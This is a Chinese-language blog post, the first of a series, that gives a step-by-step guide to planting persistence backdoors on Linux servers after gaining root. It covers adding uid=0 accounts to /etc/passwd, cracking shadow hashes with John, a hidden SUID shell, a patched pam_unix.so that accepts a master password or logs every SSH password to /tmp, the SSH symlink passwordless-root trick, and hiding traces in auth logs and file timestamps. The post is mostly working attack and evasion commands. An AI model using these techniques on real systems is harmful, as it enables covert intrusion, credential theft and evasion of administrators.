---
title: linux 服务器常见的留后门方式（一）
date: 2022-4-2 23:35:57
tags: [Backdoor,Linux,Kali]
categories: 
 - [Cyber Security,后门]
cover: https://res.cloudinary.com/sycamore/image/upload/v1682441841/Typera/2023/04/7e00f34b8462535fcbd72b5a18b714e9.png
---

:::primary
整理好了搭环境的文章：[LINUX后门复现环境搭建](https://blog.sycamore.top/2022/03/21/LINUX%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/)
:::

攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的**后门**。其目的是，方便攻击者以后对该服务器进行持久性的攻击。

其中，在linux服务器上留后门的常见技术，**本文中会提及**如下几种：
- 增加用户账号
- 破解用户密码
- 放置SUID Shell
- PAM后门
- SSH软链接后门
...

## 增加用户账号
**前提**：getshell，已获得服务器的root权限
### uid=0用户可远程登陆

可以通过下面这一行指令，增加一个**超级用户账号**：
`echo "用户名:x:0:0::/:/bin/sh" >> /etc/passwd`
然后通过：`passed 用户名`命令，修改所设超级用户的密码

#### 实现：
输入命令：
![image-20230426005018227](https://res.cloudinary.com/sycamore/image/upload/v1682441422/Typera/2023/04/a0f37b7036c0a7b07b57165d34510dc9.png)
（增加超级用户backdoor）
然后通过ssh登录backdoor账户：
![image-20230426005025313](https://res.cloudinary.com/sycamore/image/upload/v1682441429/Typera/2023/04/a74b221974a59bbf958dea2d1d49823f.png)
可以看到已经是root权限了：
![image-20230426005032317](https://res.cloudinary.com/sycamore/image/upload/v1682441436/Typera/2023/04/2523b36be81cd6a668b416a6bbf6ca66.png)

原理：给服务器增加一个**ID为0**的账号（因为**root**的ID为0）
我们可以通过`vim /etc/passwd`命令打开passwd，所有用户名称与ID的对应关系都保存在这里。
在文件开头，能看到root:
![image-20230426005041049](https://res.cloudinary.com/sycamore/image/upload/v1682441444/Typera/2023/04/8c6aa69ccdebdd7b75bfaddbc6d434d4.png)在文件的最后，我们能够找到刚刚添加的账号（backdoor）
![image-20230426005048939](https://res.cloudinary.com/sycamore/image/upload/v1682441452/Typera/2023/04/198980bd4423bb1cd26fcb757cbea990.png)已禁止uid=0用户远程登陆

管理员可以**禁止root用户**通过**ssh**的方式，远程登录服务器。

**禁止方法**如下：
（首先保证拥有一个普通用户，否则禁用之后就无法远程登陆了）
`vim /etc/ssh/sshd_config`打开 sshd_config 文件
找到 `PermitRootLogin`，改为 no
![image-20230426005055500](https://res.cloudinary.com/sycamore/image/upload/v1682441458/Typera/2023/04/fd0d61d6e7b7879eb2ea1d5f0de03dd5.png)然后重启ssh服务
此时再通过 xshell 远程登录root账户，就会被拒绝：
![image-20230426005101801](https://res.cloudinary.com/sycamore/image/upload/v1682441465/Typera/2023/04/d70b4faf22b9b537f1bbe6bb7f20d1f3.png)

如果遇到了禁用uid=0账户远程登录的情况，也可以增加一个**普通用户**：
`echo "用户名:x:1000:1000::/:/bin/sh" >> /etc/passwd`
道理都是一样的，可以观察到，我们使用的普通用户的ID就是1000

### 无交互情况下添加账户
所利用漏洞的不一样，会导致攻击者可能面临无法交互、没有回显的情况，
在这种情况下，使用前两种方法是困难的，先给出如下的方法：

命令`useradd 用户名 -u 0 -o -g root -G root`以及`echo "密码" | passwd --stdin 用户名`，
若服务器基于**Debian**，即不能使用 --stdin 操作的话，第二条改用命令`echo 用户名:密码 | chpasswd`，或者粗暴地直接用 \n 回车（因为 passwd 是需要**输入两次**密码的）：`echo "密码\n密码" | passwd 用户名`

- 第一个命令：使用useradd命令增加用户，-u 设置用户id为0（root用户），-g-G设置新用户所在群组及附加群组为root。如果禁止root远程登录，更改对应的参数就行。
- 第二个命令：添加密码（linux中新创建的用户是被锁定的，需使用passwd命令设置密码，才能投入使用）

### 
但是这种增加用户账号的方法，会很轻易地被管理员发现

## 破解用户密码
如果我们获得了某些用户的密码，那下次自然就可以直接登录了。

linux 在 passwd 中存储了用户的信息，但是 passwd 文件允许**所有用户读取**，所以若是用户密码也存放在 passwd 中，将导致用户密码**泄露**。
因此 Linux 将密码信息**单独存放**到 shadow 文件中。shadow **只有 root 用户**拥有读权限，其他用户**没有任何权限**，从而保证用户密码的安全性。

但是，如果获得shadow文件**（/etc/shadow）**，你会看到里面的密码是这样的：
![image-20230426005115328](https://res.cloudinary.com/sycamore/image/upload/v1682441478/Typera/2023/04/ee471def5fbcc8ec8666e76bd4403e8d.png)当然是密码的hash值，不会让你直接看到的密码的明文

但是，对于那些薄弱的密码，我们可以通过 **John the Ripper** 弱口令扫描工具（Kali 自带）进行破解。使用方法如下

1. 使用 unshadow 命令组合 passwd 和 shadow，获得 test：`unshadow /etc/passwd /etc/shadow > test`
2. 字典破解：使用自带的字典（usr/share/john/password.lst）：命令`john test`
使用自己的字典：命令`john --wordlist=字典路径 test`

## 放置SUID Shell
前提：getshell，已获得服务器的root权限

SUID Shell 是一种**能以 shell 拥有者权限运行**的 shell，
这个后门其实就是更改了，拥有者为root的shell的属性（rwsr-xr-x）

### 命令
root下执行命令：
`cp /bin/bash .shell`
`chmod u+s .shell`
解释：
1. 复制 /bin/bash 为当前目录下名为 .shell 的文件，
2. 更改 .shell 文件权限，设置为 u+s 后，其他用户**都享有文件拥有者的权限**（而当前为 **root**，即享有 root 权限）

下次如果从普通用户登录服务器，就能用命令：`/.shell` ，运行这个 shell，从而获得 **root** 权限。
但是，bash2针对 SUID Shell 做了一些**护卫措施**，所以如果使用上述命令运行 .shell ，只能当你在**本地**下（非远程连接）才能让 shell 的权限升为 root ，若是在远程运行，则还是原来的权限不变。

对于这种情况，需要使用这个命令运行：`/.shell -p`，这样在远程下也能获得 root 的 shell 了>

### 实现
![image-20230426005121969](https://res.cloudinary.com/sycamore/image/upload/v1682441485/Typera/2023/04/7f3bd66ffe0223053f8eec312efe1e52.png)
whoami 为 root

## PAM后门
### PAM简介：
在Linux中执行某些程序时，执行前要先对启动它的用户进行认证，比如我们经常使用的 **su**命令。
但是，实际工作时，我们常常得用**不同的认证机制**去认证不同程序的账号口令，这就会导致一个主机上有多个**不同的认证系统**，这显然是不合理的。
所以就有了**PAM机制**。**PAM** 可以说是一套**API**，使管理员可以随意地选择程序的认证方式。
PAM使用目录**/etc/pam.d/**下的配置文件，即对应着不同的认证方式。程序调用目录下相应的配置文件，从而调用本地的认证模块（**/lib/security/**）。

### 后门思路：
我们**登录**的时候，也是用PAM模块来验证我们的密码是否正确的。
所以，我们可以从源码中找到**PAM**的传统密码验证模块（pam_unix.so），**修改PAM的验证逻辑**，达成不去跟shadow里的密码校验，而是**直接返回验证正确**的效果，
然后编译出**包含后门的so文件**，替换原模块。

### 实现：
1. 直接使用脚本：https://github.com/litsand/shell/blob/master/pam.sh
2. 手动更改

#### 下载PAM源码
首先确认PAM版本：
- Debian：`dpkg -s libpam-modules | grep -i version | cut -d' ' -f2`
- Centos：`rpm -qa|grep pam`

以我的kali为例，使用`dpkg -s libpam-modules | grep -i version | cut -d' ' -f2`，得到输出：**1.4.0-11**
去 http://www.linux-pam.org/library/ 或者GitHub发布稳定版的地址 https://github.com/linux-pam/linux-pam/releases，下载到自己版本的源码：
**下载**：` wget https://github.com/linux-pam/linux-pam/releases/download/v1.4.0/Linux-PAM-1.4.0.tar.xz`
**解压**：`tar -xvf Linux-PAM-1.4.0.tar.xz`

#### 修改源码

**效果1：自定义密码添加：**

修改解压目录下的`/modules/pam_unix/pam_unix_auth.c`文件：
第173行下加入：`if (strcmp(p,"密码")==0) {return PAM_SUCCESS;}`

![image-20230426005137550](https://res.cloudinary.com/sycamore/image/upload/v1682441501/Typera/2023/04/34fdc632b2e79b17065c6ee808b2095f.png)

很简单的代码：当输入的 p 和我们设定的 "密码" 相同的时候，返回直接验证成功。

**编译：**

确保有安装**gcc编译器**和**flex库**，
**编译**命令如下：
```
cd Linux-PAM-1.4.0
./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr
make
```
未防止修改的 so 不正确，先找到原文件**备份**一个：

命令`find / -name "pam_unix.so"`  （找原文件地址）
我**原文件**的地址在：**/usr/lib/x86_64-linux-gnu/security/pam_unix.so**
编译出的**新文件**在：**root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so**
`cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.bak`（备份在 /tmp/pam_unix.so.bak）
`cp /root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so`（复制新 so 文件，覆盖原文件）

**尝试用设定的密码登录：**

（注意登录的需要是已有账户）`ssh 已有账户名@192.168.158.128`
用自定义的 **hello** 密码，登录 root 成功：

![image-20230426005144666](https://res.cloudinary.com/sycamore/image/upload/v1682441509/Typera/2023/04/8fa2af1fefbe5dab45f472a0e29e89b9.png)

**不足&优化：**

- 若是管理员**查看登录日志**：
实时查看最后10条 `tail -f -n 10 /var/log/auth.log`（视具体情况不同，日志也有可能是/var/log/secure）![image-20230426005149260](https://res.cloudinary.com/sycamore/image/upload/v1682441513/Typera/2023/04/69c6d32a187e72672948a797b8239c8a.png)
第一条是从 ssh 输入**正确密码**登录的日志，第二条是输入**自定义的密码**登陆的日志，
可以看到，第二条会比第一条多出一行记录，**报告验证失败**，
这是因为，在我们添加语句的前一行，先使用了 **_unix_verify_password** 函数进行了验证：![image-20230426005201757](https://res.cloudinary.com/sycamore/image/upload/v1682441525/Typera/2023/04/36756d8cdaf5be17fc933eb923916d51.png)
既然如此，我们可以找到函数 _unix_verify_password 的**位置**，在它验证之前，插入之前的那行代码，这样就能够**避免验证密码报错**。
更改文件的路径为 Linux-PAM-1.4.0/modules/pam_unix/support.c，如下图：![image-20230426005205935](https://res.cloudinary.com/sycamore/image/upload/v1682441530/Typera/2023/04/206c7138eeede30e24a10e586daa7fcc.png)
重新编译覆盖之后，ssh远程登录，查看日志：![image-20230426005213331](https://res.cloudinary.com/sycamore/image/upload/v1682441538/Typera/2023/04/0a3b87fb36dbc9ad01b198b4b7497f9a.png)
可以看到，第三条就和第一条一样了。
<br>
- 若是管理员查看**文件修改的时间**：
可以用 touch -r 命令修改新文件的时间：
`touch pam_unix.so -r /tmp/pam_unix.so.bak`（改为备份文件的时间）
修改前后用`stat pam_unix.so*`命令查看结果如下所示：![image-20230426005217672](https://res.cloudinary.com/sycamore/image/upload/v1682441542/Typera/2023/04/63ec0bad9935885af21524b174d934d7.png)
（仅更改了两项，可能还是会被管理员察觉，但是通过 -t 可以设定档案的时间记录)

<br>
**效果2：记录通过ssh登录的用户密码：**

同样修改解压目录下的`/modules/pam_unix/pam_unix_auth.c`文件：
在第173行下加入，如下图所示：
![image-20230426005222756](https://res.cloudinary.com/sycamore/image/upload/v1682441547/Typera/2023/04/e0996c17577375def40744fabaf69c5e.png)
每次有用户登录的时候，将用户名 name 和密码 p 保存在 /tmp/.record_pwd 文件中

保存 -> 编译 -> 覆盖 -> 从ssh用正常密码登录几次账号，提供记录的数据 -> 查看保存的文件：
`cat /tmp/.record_pwd`
![image-20230426005227686](https://res.cloudinary.com/sycamore/image/upload/v1682441550/Typera/2023/04/c09d43ce405bdb94fdbbc667420539ad.png)

## SSH软连接后门
**前提**：
- getshell，已获得服务器的root权限，
- ssh配置中开启了PAM进行身份验证（验证PAM是否开启：`cat/etc/ssh/sshd_config|grep UsePAM`）一般默认开启
- 防火墙关闭，或者开放了使用的端口号

### 原理：
- **软连接简介：**
软链接，就是一个指向另一个档案位置的，特殊的档案。
软连接以路径的形式存在。类似于Windows操作系统中的**快捷方式**。

- 若ssh配置中**开启了PAM身份验证机制**，PAM模块会搜寻相关设定文件（一般在**/etc/pam.d/**）。
而在**/etc/pam.d/su**文件中启用了**pam_rootok.so**模块。
该模块可以使root用户直接通过身份认证，**不需要**输入密码。
- 当我们指定的端口的软链接文件为 **/路径/su** 的时候，若从该端口**连接ssh**，**PAM**就会去路径`/etc/pam.d/`下找到对应的配置文件，即**/etc/pam.d/su**，
然后使用 **su** 中启用的**pam_rootok.so**模块，实现无密登录。


### 创建root账户
创建ssh软链接：`ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=端口号`（端口号确保可用）

这条命令，先是使用 ln 强制(-f)创建，路径为`/usr/sbin/sshd`文件的软连接(-s)，并保存为`/usr/local/su`文件（**路径随意**、**文件名可变**），然后把 su 文件（sshd）连到指定的端口

其中，创建的软连接名字虽然可变，但是也**不能随便命名**。可用的名字可以通过命令：`find /etc/pam.d|xargs grep "pam_rootok"`查看：
![image-20230426005233857](https://res.cloudinary.com/sycamore/image/upload/v1682441558/Typera/2023/04/fc163d487f4169876de475b8ddda580f.png)


### 实现：
![image-20230426005237555](https://res.cloudinary.com/sycamore/image/upload/v1682441561/Typera/2023/04/ca4d722ad8a618c1764639e0467bfd32.png)

这时候就能从2333端口，用root身份登入了（`ssh root@192.168.158.128 -p 2333`）：
这里使用 cmd 演示：
![](https://res.cloudinary.com/sycamore/image/upload/v1682441566/Typera/2023/04/b10b4b1d4b022009231a95b178468b94.png)





### 创建其它账户
PAM中事先是没有供其他用户免密登录的配置文件的，所以，要事先使用下面的命令，用 echo 把引号内的内容保存到`/etc/pam.d/用户名`的文件里面，让以你的用户名为文件名的配置文件使用**pam_rootok.so**模块。
```
echo " 
 #%PAM-1.0
 auth       sufficient   pam_rootok.so
 auth       include      system-auth
 account    include      system-auth
 password   include      system-auth
 session    include      system-auth " >> /etc/pam.d/已有的用户名
```
现在可以看到，在`/etc/pam.d/`文件夹下出现了一个，以你设定的用户名为名的配置文件（这里为**kali**）：
![image-20230426005247027](https://res.cloudinary.com/sycamore/image/upload/v1682441571/Typera/2023/04/2ac6a6a91723dcd035e8e9a5163dfc92.png)

现在再执行`find /etc/pam.d|xargs grep "pam_rootok"`命令查找，可以看到，可用的名字已经多了一个**kali**了：
![image-20230426005254226](https://res.cloudinary.com/sycamore/image/upload/v1682441578/Typera/2023/04/1083edad21219c631ebbe5a28ceaba4f.png)
现在再使用命令：`ln -sf /usr/sbin/sshd /usr/local/kali;/usr/local/kali -oPort=端口号`创建软链接，就能达到普通用户免密登陆的效果

**实现：**
![image-20230426005258790](https://res.cloudinary.com/sycamore/image/upload/v1682441582/Typera/2023/04/4b19889af9d0e88eadf9e812f25d2cd0.png)


![image-20230426005304178](https://res.cloudinary.com/sycamore/image/upload/v1682441588/Typera/2023/04/e00aa90c6fe6c5fda03c942cf6a9fd29.png)
